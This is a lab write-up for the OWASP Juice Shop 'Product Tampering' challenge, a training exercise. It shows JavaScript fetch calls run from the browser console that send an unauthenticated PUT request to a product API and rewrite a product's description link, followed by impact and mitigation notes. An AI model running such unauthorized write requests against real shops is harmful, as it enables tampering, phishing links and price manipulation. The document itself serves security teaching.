# Product Tampering

> [!WARNING]
> This documentation is purely for educational purposes. Do not use these techniques on real systems without explicit permission.

## Category
Broken Access Control (OWASP A01:2021) — Difficulty: ⭐⭐⭐

## Description

Change the href of the link within the OWASP SSL Advanced Forensic Tool (O-Saft) product description to https://owasp.slack.com.

## Vulnerability

The `/api/Products/:id` endpoint allows unauthenticated PUT requests to modify product data. There is no authorization check to prevent users from modifying product descriptions. This is a classic Broken Access Control vulnerability where the server trusts the client without verifying identity or permissions.

## Steps

1. Open the Juice Shop in your browser at `http://localhost:3000`
2. Open the browser developer tools by pressing `F12`
3. Navigate to the **Console** tab
4. First, find the O-Saft product ID by running:

```javascript
fetch('/api/Products/').then(r=>r.json()).then(d=>console.log(d.data.find(p=>p.name.includes('O-Saft'))))
```

5. The product ID is **9**. Now send a PUT request to modify the description:

```javascript
fetch('/api/Products/9', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    description: 'O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href="https://owasp.slack.com" target="_blank">More...</a>'
  })
}).then(r=>r.json()).then(console.log)
```

6. The response shows `status: "success"` — the link has been changed.

## Proof of Concept

![Challenge solved](./Bildschirmfoto%202026-05-24%20um%2022.27.14.png)

## Impact

An attacker can modify product descriptions, prices, or links without any authentication. In a real shop this could lead to phishing attacks, price manipulation, or reputational damage.

## Mitigation

- Require authentication and authorization for all write operations
- Validate and sanitize all input data
- Implement proper access controls on API endpoints
